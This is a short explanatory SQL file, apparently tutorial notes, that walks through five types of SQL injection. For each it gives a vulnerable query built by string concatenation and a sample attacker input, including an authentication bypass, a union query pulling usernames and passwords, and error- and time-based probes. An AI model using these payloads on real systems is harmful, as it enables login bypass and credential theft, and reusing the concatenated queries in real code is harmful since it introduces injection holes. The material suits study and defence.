-- 1. Classic SQL Injection:

--Suppose we have a login form where the username and password are concatenated directly into an SQL query without proper validation:
```SELECT * FROM users WHERE username = '$username' AND password = '$password';```

--An attacker could input the following into the username field:
' OR '1'='1

--The resulting SQL query becomes:
```SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '$password';```

-- This would allow the attacker to bypass authentication because the condition '1'='1' is always true.



-- 2. Blind SQL Injection:

--Suppose the application responds differently based on whether a condition is true or false. An attacker could exploit this behavior to extract data.

--or example, the attacker might input:

' AND (SELECT COUNT(*) FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a') = 1


-- 3. Union-Based SQL Injection:

``` SELECT * FROM products WHERE category = '$category';
' UNION SELECT username, password FROM users ```

-- If the number of columns matches, this would effectively append the results of the SELECT username, password FROM users query to the original query, potentially leaking sensitive information.


-- 4. Error-Based SQL Injection:

-- Suppose the application generates detailed error messages that reveal information about the database structure:
```SELECT * FROM products WHERE id = $id;```


-- An attacker might input:
```' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- ```

-- 5. Time-Based SQL Injection:

-- Suppose the application has a search feature that delays the response if a result is found:

``` SELECT * FROM products WHERE name = '$search_term'; ```

An attacker might input:

``` ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) ```

-- If the application delays its response, the attacker can infer that the first character of the database name is 'a'.
